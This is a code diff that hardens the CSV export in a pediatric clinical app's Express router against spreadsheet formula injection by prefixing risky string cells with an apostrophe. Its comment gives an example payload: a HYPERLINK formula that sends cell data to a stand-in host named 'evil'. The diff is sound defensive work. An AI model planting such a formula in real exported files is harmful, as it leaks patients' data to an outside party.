@@ -735,10 +735,18 @@ router.get('/activity', authMiddleware, pediatriciansOnly, async (req, res) => {
  * doubled. Quoting unconditionally rather than only when a comma is present
  * keeps the rule one line long and removes the class of bug where a clinician's
  * note containing a newline splits a row.
+ *
+ * A text cell that starts with = + - @ (or a tab / carriage return) is a formula
+ * to Excel and Sheets, whatever the quoting: a child named
+ * =HYPERLINK("http://evil/?"&A1,"Open") would run when the clinician opens the
+ * file. Such a cell gets a leading apostrophe so it is shown as text. Numbers
+ * are not text and are left alone.
  */
 function csvCell(value) {
   if (value == null) return '""';
-  return `"${String(value).replace(/"/g, '""')}"`;
+  let text = String(value);
+  if (typeof value === 'string' && /^[=+\-@\t\r]/.test(text)) text = `'${text}`;
+  return `"${text.replace(/"/g, '""')}"`;
 }
 
 function csvRow(cells) {
@@ -867,5 +875,7 @@ router.get('/clinical-status', authMiddleware, pediatriciansOnly, async (req, re
     res.status(500).json({ error: 'Could not load the clinical status summary.' });
   }
 });
+
+router._internals = { csvCell, csvRow };
 
 module.exports = router;
